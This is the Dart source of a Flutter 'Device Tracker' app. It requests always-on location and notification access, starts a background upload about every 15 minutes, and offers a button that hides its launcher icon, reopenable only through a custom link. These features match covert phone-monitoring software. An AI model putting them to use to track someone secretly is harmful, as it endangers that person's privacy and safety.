import 'dart:async';
import 'dart:developer';
import 'package:flutter/material.dart';
import 'package:get/get_navigation/get_navigation.dart';
import 'package:location/location.dart' as l;
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/services.dart';

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const GetMaterialApp(
      themeMode: ThemeMode.system,
      debugShowCheckedModeBanner: false,
      home: HomeScreen(),
    );
  }
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({Key? key}) : super(key: key);

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
  bool gpsEnabled = false;
  bool backgroundPermissionGranted = false;
  bool notificationAccessGranted = false;
  l.Location location = l.Location();

  StreamSubscription? _locationSubscription;
  List<l.LocationData> locations = [];
  bool isForegroundTrackingActive = false;

  // Method Channels
  static const backgroundPlatform = MethodChannel('com.example.location_tracking_app/background');
  static const notificationPlatform = MethodChannel('com.example.location_tracking_app/notifications');
  static const launcherPlatform = MethodChannel('com.example.location_tracking_app/launcher');

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    checkAllStatuses();
  }

  @override
  void dispose() {
    _locationSubscription?.cancel();
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      log("App resumed, re-checking statuses.");
      checkAllStatuses();
    }
  }

  Future<void> checkAllStatuses() async {
    await checkLocationStatus();
    await checkNotificationStatus();
    // No need to check icon status, as it's a one-way action
  }

  Future<void> checkLocationStatus() async {
    final isGps = await location.serviceEnabled();
    final isPermitted = await Permission.locationAlways.isGranted;
    setState(() {
      gpsEnabled = isGps;
      backgroundPermissionGranted = isPermitted;
    });
  }

  Future<void> checkNotificationStatus() async {
    try {
      final bool isGranted = await notificationPlatform.invokeMethod('checkNotificationPermission');
      if (mounted) {
        setState(() {
          notificationAccessGranted = isGranted;
        });
      }
    } on PlatformException catch (e) {
      log("Failed to check notification permission: ${e.message}");
    }
  }

  Future<void> requestEnableGps() async {
    if (!gpsEnabled) {
      bool isGpsActive = await location.requestService();
      if (mounted) setState(() => gpsEnabled = isGpsActive);
    }
  }

  Future<void> requestLocationPermission() async {
    final status = await Permission.locationAlways.request();
    if (status.isPermanentlyDenied) {
      openAppSettings();
    }
    await checkLocationStatus();
  }

  Future<void> requestNotificationPermission() async {
    try {
      await notificationPlatform.invokeMethod('requestNotificationPermission');
    } on PlatformException catch (e) {
      log("Failed to open notification settings: ${e.message}");
    }
  }

  Future<void> startBackgroundTracking() async {
    if (!gpsEnabled || !backgroundPermissionGranted || !notificationAccessGranted) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Please enable GPS, grant "Allow all the time" location, and grant Notification Access.')),
      );
      return;
    }
    try {
      await backgroundPlatform.invokeMethod('startPeriodicDataUpload');
      log("Started periodic background data upload.");
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Background tracking started! Data will be sent every ~15 minutes.')),
      );
    } on PlatformException catch (e) {
      log("Failed to start background tracking: ${e.message}");
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Error: ${e.message}')),
      );
    }
  }

  Future<void> stopBackgroundTracking() async {
    try {
      await backgroundPlatform.invokeMethod('stopPeriodicDataUpload');
      log("Stopped periodic background data upload.");
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Background tracking stopped!')),
      );
    } on PlatformException catch (e) {
      log("Failed to stop background tracking: ${e.message}");
    }
  }

  void startForegroundTracking() {
    if (isForegroundTrackingActive) return;
    _locationSubscription = location.onLocationChanged.listen((l.LocationData currentLocation) {
      setState(() {
        locations.insert(0, currentLocation);
      });
    });
    setState(() => isForegroundTrackingActive = true);
  }

  void stopForegroundTracking() {
    _locationSubscription?.cancel();
    setState(() {
      isForegroundTrackingActive = false;
      locations.clear();
    });
  }

  Future<void> _hideIcon() async {
    final bool? confirm = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Hide App Icon?'),
        content: const Text(
          'This will remove the app icon from your launcher.\n\nYou can only open the app again by clicking the link:\ndevicetracker://open\n\nAre you sure you want to continue?',
        ),
        actions: [
          TextButton(onPressed: () => Navigator.of(context).pop(false), child: const Text('Cancel')),
          TextButton(
            onPressed: () => Navigator.of(context).pop(true),
            child: const Text('Hide Icon', style: TextStyle(color: Colors.red)),
          ),
        ],
      ),
    );

    if (confirm == true) {
      try {
        await launcherPlatform.invokeMethod('hideLauncherIcon');
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('App icon will be hidden.')),
        );
      } on PlatformException catch (e) {
        log('Failed to hide icon: ${e.message}');
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Device Tracker'),
        centerTitle: true,
      ),
      body: SingleChildScrollView( // Use SingleChildScrollView to prevent overflow
        padding: const EdgeInsets.symmetric(horizontal: 12),
        child: Column(
          children: [
            buildListTile(
              "GPS",
              gpsEnabled
                  ? const Text("Enabled", style: TextStyle(color: Colors.green))
                  : ElevatedButton(onPressed: requestEnableGps, child: const Text("Enable GPS")),
            ),
            buildListTile(
              "Background Location",
              backgroundPermissionGranted
                  ? const Text("Granted", style: TextStyle(color: Colors.green))
                  : ElevatedButton(onPressed: requestLocationPermission, child: const Text("Grant Permission")),
            ),
            buildListTile(
              "Notification Access",
              notificationAccessGranted
                  ? const Text("Granted", style: TextStyle(color: Colors.green))
                  : ElevatedButton(onPressed: requestNotificationPermission, child: const Text("Grant Access")),
            ),
            const Divider(),
            const Padding(
              padding: EdgeInsets.all(8.0),
              child: Text(
                "This sends data every ~15 mins, even if the app is closed. This uses the device's battery.",
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 12, color: Colors.grey),
              ),
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                ElevatedButton.icon(
                  icon: const Icon(Icons.play_arrow),
                  label: const Text("Start Background Tracking"),
                  onPressed: startBackgroundTracking,
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                ),
                ElevatedButton.icon(
                  icon: const Icon(Icons.stop),
                  label: const Text("Stop"),
                  onPressed: stopBackgroundTracking,
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                ),
              ],
            ),
            const Divider(),
            ListTile(
              title: const Text("Show Live Location in App"),
              trailing: Switch(
                value: isForegroundTrackingActive,
                onChanged: (val) {
                  if (val) {
                    startForegroundTracking();
                  } else {
                    stopForegroundTracking();
                  }
                },
              ),
            ),
            if (isForegroundTrackingActive) // Only show the list if tracking is active
              SizedBox(
                height: 150, // Give it a fixed height
                child: ListView.builder(
                  itemCount: locations.length,
                  itemBuilder: (context, index) {
                    return ListTile(
                      dense: true,
                      title: Text("${locations[index].latitude?.toStringAsFixed(5)}, ${locations[index].longitude?.toStringAsFixed(5)}"),
                      subtitle: Text(DateTime.fromMillisecondsSinceEpoch(locations[index].time!.toInt()).toIso8601String()),
                    );
                  },
                ),
              ),
            const Divider(height: 30),
            // --- ADVANCED/DANGER ZONE SECTION ---
            Card(
              color: Colors.red.shade50,
              child: Padding(
                padding: const EdgeInsets.all(12.0),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    Text(
                      'Advanced Settings',
                      style: Theme.of(context).textTheme.titleMedium?.copyWith(color: Colors.red.shade800),
                    ),
                    const SizedBox(height: 10),
                    const Text('To open the app after hiding it, click or type this link in a browser or notes app:'),
                    const SizedBox(height: 5),
                    SelectableText(
                      'devicetracker://open',
                      style: TextStyle(fontWeight: FontWeight.bold, color: Colors.blue.shade700),
                      textAlign: TextAlign.center,
                    ),
                    const SizedBox(height: 15),
                    ElevatedButton.icon(
                      icon: const Icon(Icons.visibility_off),
                      label: const Text("Hide App Icon from Launcher"),
                      onPressed: _hideIcon,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.red.shade700,
                        foregroundColor: Colors.white,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  ListTile buildListTile(String title, Widget? trailing) {
    return ListTile(
      dense: true,
      title: Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
      trailing: trailing,
    );
  }
}
